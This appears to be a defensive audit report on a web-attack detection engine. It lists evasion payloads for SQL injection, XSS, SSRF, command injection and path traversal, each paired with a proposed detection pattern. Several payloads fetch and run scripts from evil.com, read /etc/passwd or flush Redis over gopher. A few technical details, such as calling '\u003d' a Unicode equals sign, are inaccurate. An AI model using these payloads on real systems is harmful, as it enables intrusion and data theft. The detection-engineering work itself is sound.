# Adversarial Security Audit Report: Santh Invariant Detection Engine

**Audit Date:** 2026-03-09  
**Scope:** Read-only analysis of detection classes and evaluators  
**Objective:** Identify evasion gaps, false negatives, and detection weaknesses

---

## Executive Summary

This audit analyzed the Santh invariant detection engine's capability to detect sophisticated adversarial payloads. While the engine implements defense-in-depth with L1 (regex) and L2 (structural) detection layers, **multiple evasion vectors exist** that could allow attackers to bypass detection entirely.

**Overall Risk Rating: HIGH** - 23 distinct evasion techniques identified across 5 attack classes.

---

## 1. SQL INJECTION EVASION GAPS

### 1.1 Unicode Normalization Attacks (EVASION CONFIRMED)

**Payload:**
```
' OR 1=1--
' OR​ 1=1--                    (zero-width space after OR)
' OЕR 1=1--                    (Cyrillic Е instead of Latin E)
' OR 1=1--                    (Unicode equals sign)
Ｇ' OR 1=1--                   (Fullwidth G - bypasses quote detection)
```

**Why It Evades:**
- The `deepDecode()` function in `encoding.ts` handles basic homoglyph normalization but **only covers Cyrillic/Greek lookalikes for A-Z, not extended cases**
- Zero-width characters are stripped, but the subsequent SQL tokenizer may interpret the remaining fragments differently
- Fullwidth characters are normalized via `normalizeFullwidth()` but this occurs BEFORE quote analysis, potentially allowing quote bypasses

**Current Detection (Gap):**
```typescript
// encoding.ts lines 90-135 - Limited homoglyph map
const HOMOGLYPH_MAP: Record<string, string> = {
    // Only covers A-Z, a-z basic mappings
    // MISSING: digits, operators, punctuation homoglyphs
}
```

**Fix Required:**
```typescript
// Add to encoding.ts - Extended homoglyph normalization
const EXTENDED_HOMOGLYPH_MAP: Record<string, string> = {
    // Mathematical operators that normalize to comparison operators
    '\u003d': '=',  // Unicode equals
    '\u2260': '!=', // Not equal (could be abused for != comparisons)
    '\u2248': '~',  // Almost equal
    // Fullwidth operators
    '\uff1d': '=',  // Fullwidth equals
    '\uff1c': '<',  // Fullwidth less-than
    '\uff1e': '>',  // Fullwidth greater-than
    // Digit homoglyphs (Cyrillic/Greek numbers)
    '\u0660': '0', '\u0661': '1', // Arabic-Indic digits
    '\u06f0': '0', '\u06f1': '1', // Extended Arabic-Indic
    // Quotation mark homoglyphs that evade string termination detection
    '\u2018': "'", '\u2019': "'",  // Smart quotes
    '\u201c': '"', '\u201d': '"',  // Smart double quotes
    '\u0060': "'",                 // Grave accent as quote
}
```

---

### 1.2 MySQL Charset Tricks (CRITICAL EVASION)

**Payload:**
```
?id=%df' OR 1=1--                  (GBK multi-byte: %df\x27 → 運')
?id=%bf' OR 1=1--                  (GBK: %bf\x5c → 縗')
?id=%c0' OR 1=1--                  (MySQL GBK character consumption)
?id=%a1%b1' OR 1=1--               (BIG5 multi-byte escape)
```

**Why It Evades:**
- The `sqlTokenize()` function in `sql-expression-evaluator.ts` tokenizes input character-by-character
- Multi-byte character sequences that consume the escape backslash or quote are not handled
- The `deepDecode()` function does NOT simulate database-specific character set handling

**Current Detection (Gap):**
```typescript
// sql-expression-evaluator.ts - No charset-aware tokenization
function sqlTokenize(input: string): SqlToken[] {
    // Processes raw characters without considering multi-byte charsets
    // GBK %df' appears as two tokens, but MySQL sees it as one character + unescaped quote
}
```

**Fix Required:**
```typescript
// Add to sql-expression-evaluator.ts
function detectCharsetEscapeBypass(input: string): boolean {
    // GBK/GB2312: High-byte (0x81-0xFE) followed by quote/backslash
    const GBK_ESCAPE_PATTERN = /%[df][0-9a-f]['"\\]/i;
    // BIG5: Lead byte 0xA1-0xF9 followed by quote
    const BIG5_ESCAPE_PATTERN = /%a[1-9a-f][0-9a-f]['"\\]/i;
    // SJIS: Lead byte 0x81-0x9F, 0xE0-0xFC
    const SJIS_ESCAPE_PATTERN = /%(?:8[1-9a-f]|9[0-9a-f]|e[0-9a-f]|f[0-9a-f])[0-9a-f]['"\\]/i;
    
    return GBK_ESCAPE_PATTERN.test(input) || 
           BIG5_ESCAPE_PATTERN.test(input) || 
           SJIS_ESCAPE_PATTERN.test(input);
}
```

---

### 1.3 Second-Order SQL Injection (EVASION CONFIRMED)

**Payload:**
```
// First request (stored benign, detected as safe)
username: admin'--

// Second request (retrieved and executed)
SELECT * FROM users WHERE username = 'admin'--'
```

**Why It Evades:**
- `sqlSecondOrder` class in `second-order.ts` only detects specific stored procedure patterns
- Does not track state across multiple requests
- Truncation comment patterns (`--`) at the end of stored values are detected as benign when stored

**Current Detection (Gap):**
```typescript
// second-order.ts - Limited pattern detection
export const sqlSecondOrder: InvariantClassModule = {
    // Only detects: stored procedure re-execution, HAVING clauses
    // Does NOT detect: comment-truncated stored values that become dangerous on retrieval
}
```

**Fix Required:**
```typescript
// Enhanced second-order detection
function detectStoredInjectionContext(input: string): boolean {
    // Detect comment-truncated values that would be dangerous when concatenated
    const truncationPatterns = [
        /['"]\s*--\s*$/,           // Quote + comment at end
        /['"]\s*\/\*.*\*\/\s*$/,  // Quote + block comment at end
        /['"]\s*#\s*$/,            // MySQL comment
        /['"]\s*;\s*$/,            // Statement terminator
    ];
    
    // Check if value would be dangerous in SELECT context
    const dangerousInConcat = [
        /^['"]\s*OR\s+['"]?\d/,    // OR boolean
        /^['"]\s*AND\s+['"]?\d/,   // AND boolean
        /^['"]\s*UNION\s/i,        // UNION
        /^['"]\s*;\s*(SELECT|INSERT|UPDATE|DELETE)/i,  // Stacked query
    ];
    
    return truncationPatterns.some(p => p.test(input)) &&
           dangerousInConcat.some(p => p.test(input));
}
```

---

### 1.4 TIME-Based via SLEEP in Subqueries (PARTIAL EVASION)

**Payload:**
```
' AND (SELECT CASE WHEN (1=1) THEN (SELECT SLEEP(5) FROM information_schema.tables LIMIT 1) ELSE 1 END)--
' AND EXISTS(SELECT * FROM (SELECT SLEEP(5))a)
' AND 1=(SELECT COUNT(*) FROM information_schema.tables WHERE SLEEP(5))
' UNION SELECT (SELECT SLEEP(5)),2,3--
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=97,SLEEP(5),0)--
```

**Why It Evades:**
- `sqlTimeOracle` class uses regex patterns that may miss nested SLEEP calls
- The L2 structural evaluator `detectTimeOracle()` only checks for direct function calls at token level
- Subquery-wrapped time functions are not detected as the `PAREN_OPEN` is inside the subquery

**Current Detection (Gap):**
```typescript
// sql-structural-evaluator.ts lines 251-313
function detectTimeOracle(tokens: SqlToken[]): SqlStructuralDetection[] {
    // Only checks direct: SLEEP(5), WAITFOR DELAY
    // Does NOT recursively analyze subqueries
}
```

**Fix Required:**
```typescript
// Add recursive subquery analysis
function detectNestedTimeFunctions(tokens: SqlToken[]): SqlStructuralDetection[] {
    const detections: SqlStructuralDetection[] = [];
    const TIME_FUNCTIONS = /\b(SLEEP|PG_SLEEP|BENCHMARK|DBMS_LOCK\.SLEEP)\b/i;
    
    // Find SELECT tokens and check their scope for time functions
    for (let i = 0; i < tokens.length; i++) {
        if (tokens[i].type === 'KEYWORD' && tokens[i].value === 'SELECT') {
            // Scan until matching parenthesis depth returns to 0
            let depth = 0;
            let j = i;
            while (j < tokens.length) {
                if (tokens[j].type === 'PAREN_OPEN') depth++;
                if (tokens[j].type === 'PAREN_CLOSE') depth--;
                
                // Check for time function at any depth
                if ((tokens[j].type === 'IDENTIFIER' || tokens[j].type === 'KEYWORD') &&
                    TIME_FUNCTIONS.test(tokens[j].value)) {
                    if (j + 1 < tokens.length && tokens[j + 1].type === 'PAREN_OPEN') {
                        detections.push({
                            type: 'time_oracle',
                            detail: `Nested time function: ${tokens[j].value}() in subquery`,
                            position: tokens[j].position,
                            confidence: 0.92
                        });
                    }
                }
                
                if (depth === 0 && j > i) break;
                j++;
            }
        }
    }
    return detections;
}
```

---

## 2. XSS EVASION GAPS

### 2.1 Mutation XSS (mXSS) via InnerHTML (EVASION CONFIRMED)

**Payload:**
```html
<img src=x onerror=alert(1)><!--<img src=x onerror=alert(2)>--!>
<style><!--</style><script>alert(1)</script>--></style>
<svg></p><style><img src=x onerror=alert(1)//</style>
<p title="--><script>alert(1)</script>"><table><td><marquee><script>alert(1)</script></marquee></td></table>
```

**Why It Evades:**
- `l2AdvancedXssBypass()` in `l2-adapters.ts` (lines 935-999) has basic mXSS detection for `<style>`, `<xmp>`, `<noscript>`, `<math>`, `<plaintext>`
- Does NOT detect namespace confusion attacks where HTML parser re-contextualizes content
- Missing detection for mutations caused by table/nobr elements

**Current Detection (Gap):**
```typescript
// l2-adapters.ts lines 939-950 - Limited mXSS detection
const mxssMatch = d.match(/<(?:style|xmp|noscript|math|plaintext)[^>]*>[\s\S]*?<\/[^>]*>/i)
// Only 5 tag types checked - missing many mXSS vectors
```

**Fix Required:**
```typescript
// Enhanced mXSS detection
function detectMutationXSS(input: string): boolean {
    const MXSS_PATTERNS = [
        // Table/cell mutation (table context breaks out)
        /<table[^>]*>[\s\S]*?<td[^>]*>[\s\S]*?<\w+[^>]*\b(?:href|src|on\w+)\s*=/i,
        // Style comment mutation
        /<style[^>]*>[\s\S]*?<!--[\s\S]*?(?:script|on\w+|javascript:)/i,
        // SVG foreignObject mutation
        /<svg[^>]*>[\s\S]*?<foreignObject[^>]*>[\s\S]*?(?:script|on\w+|javascript:)/i,
        // MathML mglyph mutation
        /<math[^>]*>[\s\S]*?<mglyph[^>]*>[\s\S]*?(?:script|on\w+)/i,
        // Template shadow DOM mutation
        /<template[^>]*>[\s\S]*?<script[\s\S]*?<\/template>/i,
        // Noscript with attribute breakout
        /<noscript[^>]*>[\s\S]*?['"][^>]*><\w+[^>]*\bon\w+\s*=/i,
        // XML CDATA to HTML transition
        /<![CDATA\[[\s\S]*?]]>[\s\S]*?(?:script|on\w+|javascript:)/i,
        // Self-closing tag exploitation
        /<\w+\s[^>]*\/\s*>([\s\S]*?<\/\w+>)?\s*<\w+[^>]*\bon\w+\s*=/i,
    ];
    
    return MXSS_PATTERNS.some(p => p.test(input));
}
```

---

### 2.2 DOM Clobbing via __proto__ and constructor (EVASION CONFIRMED)

**Payload:**
```html
<img id=__proto__ src=x name=polluted onerror=alert(1)>
<form id=constructor><input name=prototype><input name=polluted value=alert(1)>
<img id=__proto__ name=isAdmin value=true>
<a id=__proto__ href=javascript:alert(1)>
<img name=plugins src=x onerror=alert(1)>
```

**Why It Evades:**
- `xssTagInjection` in `tag-injection.ts` has basic DOM clobbering detection (lines 14-15) for specific patterns
- Only checks `id=x name=x href=javascript:` and `form id=x input name=action`
- Missing `__proto__`, `constructor.prototype`, and other prototype chain pollution vectors

**Current Detection (Gap):**
```typescript
// tag-injection.ts lines 14-15 - Very limited DOM clobbering detection
const TAG_INJECTION_DOM_CLOBBER_LINK_PATTERN = /<img[^>]*\bid[^>]*><a[^>]*\bid[^>]*\bname[^>]*\bhref\s*=\s*['"]?\s*javascript:/i
const TAG_INJECTION_DOM_CLOBBER_FORM_ACTION_PATTERN = /<form[^>]*\bid[^>]*>.*?<input[^>]*\bname\s*=\s*['"]?action/i
```

**Fix Required:**
```typescript
// Enhanced DOM clobbering detection
const DOM_CLOBBERING_PATTERNS = [
    // __proto__ pollution
    /<\w+[^>]*\bid\s*=\s*['"]?__proto__['"]?[^>]*>/i,
    // constructor.prototype pollution
    /<\w+[^>]*\bid\s*=\s*['"]?constructor['"]?[^>]*>.*?<\w+[^>]*\bname\s*=\s*['"]?prototype['"]?/i,
    // document.forms collection pollution
    /<form[^>]*\bname\s*=\s*['"]?\w+['"]?[^>]*>.*?<input[^>]*\bname\s*=\s*['"]?\w+['"]?[^>]*\bvalue\s*=\s*['"]?javascript:/i,
    // HTMLCollection named access pollution
    /<img[^>]*\bname\s*=\s*['"]?\w+['"]?[^>]*\bonerror\s*=/i,
    // anchor name pollution
    /<a[^>]*\bname\s*=\s*['"]?\w+['"]?[^>]*\bhref\s*=\s*['"]?javascript:/i,
    // Multi-element id collision
    /<\w+[^>]*\bid\s*=\s*['"]?\w+['"]?[^>]*>.*<\w+[^>]*\bid\s*=\s*['"]?\1['"]?/i,
];
```

---

### 2.3 SVG-Based XSS via ForeignObject and animate (EVASION CONFIRMED)

**Payload:**
```html
<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>
<svg><animate attributeName="href" values="javascript:alert(1)" />
<svg><set attributeName="innerHTML" to="<img src=x onerror=alert(1)>" />
<svg><animateMotion onend="alert(1)" />
<svg><animateTransform onbegin="alert(1)" />
<svg><feImage xlink:href="javascript:alert(1)" />
<svg><use href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>" />
```

**Why It Evades:**
- `l2AdvancedXssBypass()` (lines 952-962) has basic SVG detection for `onbegin|onend|onrepeat|onload` and `xlink:href`
- Missing: `<animate>` href attribute, `<set>` innerHTML, `<use>` with data URI, `<feImage>`
- ForeignObject XHTML namespace injection not detected

**Current Detection (Gap):**
```typescript
// l2-adapters.ts lines 952-962
const svgMatch = d.match(/<svg[\s\S]*?(?:onbegin|onend|onrepeat|onload)\s*=/i) ||
                 d.match(/xlink:href\s*=\s*['"]?(?:javascript:|data:)/i)
// Missing many SVG attack vectors
```

**Fix Required:**
```typescript
// Enhanced SVG XSS detection
const SVG_XSS_PATTERNS = [
    // SVG SMIL animation with JavaScript
    /<svg[^>]*>[\s\S]*?<(?:animate|animateMotion|animateTransform|set)[^>]*\b(?:href|to|values)\s*=\s*['"]?javascript:/i,
    // SVG foreignObject XHTML injection
    /<svg[^>]*>[\s\S]*?<foreignObject[^>]*>[\s\S]*?<(?:body|div|script)[^>]*\bxmlns\s*=\s*['"]?http:\/\/www\.w3\.org\/1999\/xhtml['"]?/i,
    // SVG use element with data URI
    /<svg[^>]*>[\s\S]*?<use[^>]*\b(?:href|xlink:href)\s*=\s*['"]?data:/i,
    // SVG feImage with JavaScript
    /<svg[^>]*>[\s\S]*?<feImage[^>]*\b(?:href|xlink:href)\s*=\s*['"]?javascript:/i,
    // SVG script element
    /<svg[^>]*>[\s\S]*?<script[^>]*>[\s\S]*?(?:alert|prompt|confirm|eval|fetch)\s*\(/i,
    // SVG animate with innerHTML/setAttribute
    /<svg[^>]*>[\s\S]*?<animate[^>]*\battributeName\s*=\s*['"]?(?:innerHTML|outerHTML|insertAdjacentHTML)/i,
];
```

---

### 2.4 CSS Expression() in IE Compatibility Mode (PARTIAL EVASION)

**Payload:**
```css
width: e\xpression(alert(1));
width: expr/*XSS*/ession(alert(1));
width: expression(alert(1));  // standard - detected
background: -moz-binding(url(//evil.com/xbl.xml));
behavior: url(#default#VML);
-ms-filter: "progid:DXImageTransform.Microsoft.AlphaImageLoader(src='javascript:alert(1)')";
```

**Why It Evades:**
- `l2CssInjection()` (lines 821-828) detects `expression()` but regex is case-sensitive to some evasions
- CSS comment injection within `expression` bypasses the pattern
- IE-specific `-ms-filter` with JavaScript not detected

**Current Detection (Gap):**
```typescript
// l2-adapters.ts line 821
const expressionMatch = d.match(/\bexpression\s*\(\s*[^)]{1,220}\)/i)
// Only basic expression() - no comment injection handling
```

**Fix Required:**
```typescript
// Enhanced CSS injection detection
const CSS_INJECTION_PATTERNS = [
    // Expression with comment bypass: expr/**/ession
    /\be(?:\/\*[^*]*\*\/|\\s)+x(?:\/\*[^*]*\*\/|\\s)+p(?:\/\*[^*]*\*\/|\\s)+r(?:\/\*[^*]*\*\/|\\s)+e(?:\/\*[^*]*\*\/|\\s)+s(?:\/\*[^*]*\*\/|\\s)+s(?:\/\*[^*]*\*\/|\\s)+i(?:\/\*[^*]*\*\/|\\s)+o(?:\/\*[^*]*\*\/|\\s)+n\s*\(/i,
    // Hex-escaped expression
    /\be\\x70r\\x65ssion\s*\(/i,
    // IE filter with JavaScript
    /-ms-filter\s*:\s*['"]?[^'"]*(?:javascript|vbscript):/i,
    // Moz-binding (Firefox XBL)
    /-moz-binding\s*:\s*url\s*\(/i,
    // IE behavior with htc
    /behavior\s*:\s*url\s*\(\s*['"]?[^)]*\.htc/i,
    // CSS import with JavaScript protocol
    /@import\s+(?:url\s*\()?['"]?\s*javascript:/i,
];
```

---

## 3. SSRF EVASION GAPS

### 3.1 DNS Rebinding Simulation (PARTIAL EVASION)

**Payload:**
```
http://make-127.0.0.1-rebind.r7.io/
http://attacker-rebind.com/ (TTL=0, returns 127.0.0.1 on second request)
http://1.1.1.1.nip.io/ → 1.1.1.1 (bypasses if nip.io not in DNS rebinding list)
http://169.254.169.254.nip.io/ → metadata via rebinding
http://0000:0000:0000:0000:0000:0000:0000:0001/ (IPv6 localhost variants)
```

**Why It Evades:**
- `detectInternalReach()` in `ssrf-evaluator.ts` (lines 294-358) checks known DNS rebinding services
- List at line 324 is limited: `localtest.me`, `lvh.me`, `yurets.dev`, `1u.ms`
- Missing newer rebinding services and generic detection for time-to-live (TTL) manipulation

**Current Detection (Gap):**
```typescript
// ssrf-evaluator.ts lines 324, 337-355
const LOCALHOST_ALIASES = new Set(['localtest.me', 'lvh.me', 'yurets.dev', '1u.ms'])
const rebindServices = ['.nip.io', '.xip.io', '.sslip.io']
// Missing many rebinding services and TTL-based detection
```

**Fix Required:**
```typescript
// Enhanced DNS rebinding detection
const DNS_REBINDING_SERVICES = [
    '.nip.io', '.xip.io', '.sslip.io', '.localtest.me', '.lvh.me',
    '.yurets.dev', '.1u.ms', '.clinton.kiwi', '.lfl.moscow',
    '.oastify.com', '.oast.pro', '.oast.live', '.oast.site',  // Interactsh
    '.burpcollaborator.net', '.canarytokens.com',
    '.dnsexit.com', '.changeip.com', '.ddns.net',  // Dynamic DNS
];

// Detect potential rebinding by pattern (IP-embedded domains)
function detectPotentialRebinding(hostname: string): boolean {
    // Pattern: domain containing IP-like structure
    const IP_IN_DOMAIN = /\b(\d{1,3}[-.]\d{1,3}[-.]\d{1,3}[-.]\d{1,3})\./;
    // Pattern: hex IP in domain
    const HEX_IP_DOMAIN = /\b(0x[0-9a-f]+)\./i;
    // Pattern: octal IP in domain  
    const OCTAL_IP_DOMAIN = /\b0[0-7]{7,11}\./;
    
    return IP_IN_DOMAIN.test(hostname) || 
           HEX_IP_DOMAIN.test(hostname) || 
           OCTAL_IP_DOMAIN.test(hostname);
}
```

---

### 3.2 IPv6 Bypass Variants (EVASION CONFIRMED)

**Payload:**
```
http://[::1]/                      (detected)
http://[::ffff:127.0.0.1]/         (detected)
http://[0000:0000:0000:0000:0000:0000:0000:0001]/
http://[0:0:0:0:0:0:0:1]/
http://[::ffff:7f00:1]/
http://[::ffff:0:1]/               (127.0.0.1 variant)
http://[fe80::1%25en0]/            (link-local with scope)
http://[fe80::1%en0]/              (URL-encoded %)
http://[::]/                       (unspecified, treated as localhost by some)
```

**Why It Evades:**
- `parseIPRepresentation()` in `ssrf-evaluator.ts` (lines 119-221) handles basic IPv6
- Does NOT handle all compressed forms and scope IDs
- Missing `[::]` (unspecified address) which some libraries treat as localhost

**Current Detection (Gap):**
```typescript
// ssrf-evaluator.ts lines 123-139
// Only handles ::1, ::ffff:127.0.0.1, ::ffff:7f00:1, 0:0:0:0:0:ffff:7f00:1
// Missing: [0000:0000:...], [0:0:0:0:0:0:0:1], [fe80::1%scope], [::]
```

**Fix Required:**
```typescript
// Enhanced IPv6 detection
function parseIPv6Comprehensive(host: string): string | null {
    const h = host.replace(/^\[|\]$/g, '').trim();
    
    // Expanded form normalization
    const expandIPv6 = (ip: string): string | null => {
        // Handle :: compression
        if (ip.includes('::')) {
            const parts = ip.split('::');
            if (parts.length !== 2) return null;
            const left = parts[0] ? parts[0].split(':') : [];
            const right = parts[1] ? parts[1].split(':') : [];
            const missing = 8 - left.length - right.length;
            if (missing < 0) return null;
            const middle = new Array(missing).fill('0');
            return [...left, ...middle, ...right].join(':');
        }
        return ip;
    };
    
    // Check for localhost equivalents
    const expanded = expandIPv6(h);
    if (!expanded) return null;
    
    const segments = expanded.split(':').map(s => parseInt(s || '0', 16));
    if (segments.length !== 8) return null;
    
    // ::1 (loopback)
    if (segments.every((s, i) => i === 7 ? s === 1 : s === 0)) return '127.0.0.1';
    // ::ffff:x:x (IPv4-mapped)
    if (segments[0] === 0 && segments[1] === 0 && segments[2] === 0 && 
        segments[3] === 0 && segments[4] === 0 && segments[5] === 0xffff) {
        const ip4 = ((segments[6] << 16) | segments[7]) >>> 0;
        return ipNumToString(ip4);
    }
    // fe80::/10 (link-local - can reach internal services)
    if ((segments[0] & 0xffc0) === 0xfe80) return 'link-local';
    
    return null;
}
```

---

### 3.3 URL Shortener Chains (EVASION CONFIRMED)

**Payload:**
```
https://bit.ly/3xxxxx → redirects to http://127.0.0.1/admin
https://tinyurl.com/yyyyy → redirects to http://169.254.169.254/
https://t.co/zzzzz → redirects to file:///etc/passwd
https://short.link/test → redirects to gopher://127.0.0.1:6379/
```

**Why It Evades:**
- Current SSRF detection only checks final URL, not intermediate redirects
- URL shorteners are detected (line 48 in ssrf/index.ts) but only as indicators, not with follow analysis
- No recursive URL resolution to check redirect chains

**Current Detection (Gap):**
```typescript
// ssrf/index.ts line 48 - Only pattern matching for shorteners
/bit\.ly(?:\/|$)|tinyurl\.com(?:\/|$)|t\.co(?:\/|$)/i
// No actual redirect chain analysis
```

**Fix Required:**
```typescript
// URL shortener chain detection (note: actual resolution would require HTTP requests)
const URL_SHORTENER_DOMAINS = new Set([
    'bit.ly', 'tinyurl.com', 't.co', 'goo.gl', 'ow.ly', 
    'short.link', 'is.gd', 'buff.ly', 'rebrand.ly',
    'rb.gy', 'short.io', 'cutt.ly', 'shorturl.at',
]);

function detectShortenerChain(input: string): { isShortener: boolean; risk: 'high' | 'medium' } {
    try {
        const url = new URL(input);
        const isShortener = URL_SHORTENER_DOMAINS.has(url.hostname.toLowerCase());
        // High risk if shortener + internal-looking path or query
        const hasInternalIndicators = /(?:admin|internal|api|127|localhost|192\.168|10\.)/i.test(url.pathname + url.search);
        return {
            isShortener,
            risk: isShortener && hasInternalIndicators ? 'high' : (isShortener ? 'medium' : 'low')
        };
    } catch {
        return { isShortener: false, risk: 'low' };
    }
}
```

---

### 3.4 Gopher Protocol Variants (PARTIAL EVASION)

**Payload:**
```
gopher://127.0.0.1:6379/_FLUSHALL
gopher://127.0.0.1:3306/%0aSELECT%20*%20FROM%20mysql.user%0a
gopher://[::1]:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%01%04%00%01%01%05%05%00%0f%10%53%54%44%49%4e%0c%01%05%00%00%00%00%00%01%04%00%01%03%04%02%00%0e%03%53%45%4c%45%43%54%20%2a%20%46%52%4f%4d%20%75%73%65%72%73
GOPHER://127.0.0.1:6379/_INFO
%67%6f%70%68%65%72://127.0.0.1:6379/_FLUSHALL
```

**Why It Evades:**
- `ssrfProtocolSmuggle` (lines 173-179) detects `gopher://` via case-insensitive regex
- However, URL-encoded protocol versions may bypass if `deepDecode` is applied inconsistently
- Some encoded variants in `knownPayloads` suggest awareness but detection may be inconsistent

**Current Detection (Gap):**
```typescript
// ssrf/index.ts lines 173-179
const PROTOCOL_RE = /(?:file|gopher|dict|ldap|tftp|ftp|jar|netdoc|phar|expect|data|php|zip):\/\//i
// Checks both decoded and raw input, but encoded protocol strings after deepDecode may not match
```

---

## 4. COMMAND INJECTION EVASION GAPS

### 4.1 $IFS Substitution Combos (PARTIAL EVASION)

**Payload:**
```
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat${IFS:?}/etc/passwd
cat${IFS:- }/etc/passwd
cat"${IFS}"\/etc\/passwd
cat${IFS%?}/etc/passwd
cat${IFS%% }/etc/passwd
cat${IFS# }/etc/passwd
cat${IFS## }/etc/passwd
cat${IFS// /}/etc/passwd  # Pattern substitution
```

**Why It Evades:**
- `detectVariableExpansionViolations()` in `cmd-injection-evaluator.ts` (lines 305-338) detects `$IFS`
- But only basic `${IFS}` pattern, not advanced parameter expansion forms like `${IFS%?}`, `${IFS:- }`
- Shell tokenizer may not correctly parse complex parameter expansions

**Current Detection (Gap):**
```typescript
// cmd-injection-evaluator.ts lines 313-317
const varName = tok.value.replace(/^\$\{?/, '').replace(/\}?$/, '')
if (varName === 'IFS') confidence = 0.88
// Only checks for exact 'IFS' after stripping braces
```

**Fix Required:**
```typescript
// Enhanced IFS detection with parameter expansion
const IFS_SUBSTITUTION_PATTERNS = [
    // Basic IFS
    /\$\{?IFS\}?/,
    // IFS with parameter expansion operators
    /\$\{IFS[%#:\/][^}]*\}/,
    // IFS with pattern substitution
    /\$\{IFS\/[^}]*\/[^}]*\}/,
    // Default value expansion with IFS
    /\$\{IFS:-[^}]*\}/,
    // Alternative value expansion
    /\$\{IFS:\+[^}]*\}/,
    // Substring removal
    /\$\{IFS[#%]{1,2}[^}]*\}/,
];

function detectAdvancedIfsSubstitution(input: string): boolean {
    return IFS_SUBSTITUTION_PATTERNS.some(p => p.test(input));
}
```

---

### 4.2 Base64 Decode + Eval Chains (EVASION CONFIRMED)

**Payload:**
```
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | sh
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
eval $(echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d)
$(echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | sh)
perl -e 'print unpack("H*", "cat /etc/passwd")' | xxd -r -p | sh
python3 -c "import base64; exec(base64.b64decode('Y2F0IC9ldGMvcGFzc3dk'))"
```

**Why It Evades:**
- No detection for base64-encoded command pipelines
- The shell tokenizer sees `echo`, `base64`, `sh` as separate commands but doesn't recognize the data flow
- `eval` combined with command substitution may not be flagged as high risk

**Fix Required:**
```typescript
// Base64 + execution pipeline detection
const BASE64_EXEC_PATTERNS = [
    // echo base64 | base64 -d | shell
    /echo\s+['"]?[A-Za-z0-9+\/]{10,}={0,2}['"]?\s*\|\s*base64\s+-d\s*\|\s*(?:sh|bash|zsh|ksh)/i,
    // eval with base64 decode
    /eval\s*\$?\([^)]*base64\s+-d[^)]*\)/i,
    // Command substitution with base64
    /\$\([^)]*base64\s+-d[^)]*\|\s*(?:sh|bash)/i,
    // Python/Perl base64 decode + exec
    /python\d?\s+-c\s+['"][^'"]*base64[^'"]*(?:exec|eval|system)/i,
    /perl\s+-e\s+['"][^'"]*base64[^'"]*(?:exec|eval|system)/i,
    // xxd reverse with shell
    /xxd\s+-r\s+-p\s*\|\s*(?:sh|bash)/i,
];

function detectObfuscatedCommandChain(input: string): boolean {
    return BASE64_EXEC_PATTERNS.some(p => p.test(input));
}
```

---

### 4.3 Process Substitution <(cmd) (EVASION CONFIRMED)

**Payload:**
```
cat <(whoami)
cat <(cat /etc/passwd)
sh <(curl -s http://evil.com/payload.sh)
bash <(wget -qO- http://evil.com/payload.sh)
. <(curl -s http://evil.com/rcfile)
source <(curl -s http://evil.com/rcfile)
```

**Why It Evades:**
- Shell tokenizer in `shell-tokenizer.ts` does NOT have a specific token type for process substitution `<(`
- The `<` is tokenized as `REDIRECT_IN`, not as process substitution
- No detection for the `<(command)` pattern

**Current Detection (Gap):**
```typescript
// shell-tokenizer.ts lines 235-243
if (ch === '<') {
    if (bounded[i + 1] === '<') {
        tokens.push({ type: 'HEREDOC', value: '<<', start: i, end: i + 2 })
    } else {
        tokens.push({ type: 'REDIRECT_IN', value: '<', start: i, end: i + 1 })
    }
    // Missing: check for <( process substitution
}
```

**Fix Required:**
```typescript
// Add to shell-tokenizer.ts
if (ch === '<') {
    if (bounded[i + 1] === '<') {
        tokens.push({ type: 'HEREDOC', value: '<<', start: i, end: i + 2 })
        i += 2;
    } else if (bounded[i + 1] === '(') {
        // Process substitution <(command)
        tokens.push({ type: 'PROCESS_SUBST_OPEN', value: '<(', start: i, end: i + 2 })
        i += 2;
    } else {
        tokens.push({ type: 'REDIRECT_IN', value: '<', start: i, end: i + 1 })
        i++;
    }
    continue;
}

// Add detection in cmd-injection-evaluator.ts
function detectProcessSubstitution(tokens: Token<ShellTokenType>[]): boolean {
    for (let i = 0; i < tokens.length; i++) {
        if (tokens[i].type === 'PROCESS_SUBST_OPEN') {
            // Check if next word is a dangerous command
            const nextWord = findNextOfType(tokens, i + 1, 'WORD');
            if (nextWord && DANGEROUS_COMMANDS.has(nextWord.value.toLowerCase())) {
                return true;
            }
        }
    }
    return false;
}
```

---

### 4.4 Backtick Variations and Newline Injection (PARTIAL EVASION)

**Payload:**
```
`\whoami`                    # escaped backtick content
$(\whoami)                   # escaped dollar-paren
$'\x77\x68\x6f\x61\x6d\x69'  # ANSI-C quoted string
$"\u0077hoami"               # Locale-specific translation
cat `/etc/passwd`            # backticks around path
```

**Why It Evades:**
- ANSI-C quoted strings `$'...'` are not handled by the shell tokenizer
- Escaped characters within backticks may bypass command detection

**Fix Required:**
```typescript
// Add ANSI-C quoted string detection to shell tokenizer
if (ch === '$' && bounded[i + 1] === "'") {
    const start = i;
    i += 2; // skip $'
    while (i < bounded.length && bounded[i] !== "'") {
        if (bounded[i] === '\\') i += 2; // skip escape sequence
        else i++;
    }
    if (i < bounded.length) i++; // skip closing '
    tokens.push({ type: 'ANSI_C_QUOTED', value: bounded.slice(start, i), start, end: i });
    continue;
}
```

---

## 5. PATH TRAVERSAL EVASION GAPS

### 5.1 URL Encoding Layers (PARTIAL EVASION)

**Payload:**
```
..%252f..%252f..%252fetc/passwd       (double-encoded /)
..%25252f..%25252fetc%25252fpasswd    (triple-encoded)
..%c0%af..%c0%af..%c0%afetc/passwd   (overlong UTF-8)
..%ef%bc%8f..%ef%bc%8fetc/passwd     (fullwidth slash)
..%e0%80%ae/etc/passwd                (overlong dot)
```

**Why It Evades:**
- `pathEncodingBypass` class (lines 129-143) handles basic multi-layer encoding
- `deepDecode()` in `path-traversal-evaluator.ts` only does 5 iterations
- Triple-encoding and specific overlong sequences may not be fully resolved

**Current Detection (Gap):**
```typescript
// path-traversal-evaluator.ts lines 61-99 - 5 iterations max
function deepDecode(input: string, maxIterations: number = 5): { decoded: string; layers: number }
// Some sophisticated encodings require more than 5 layers
```

---

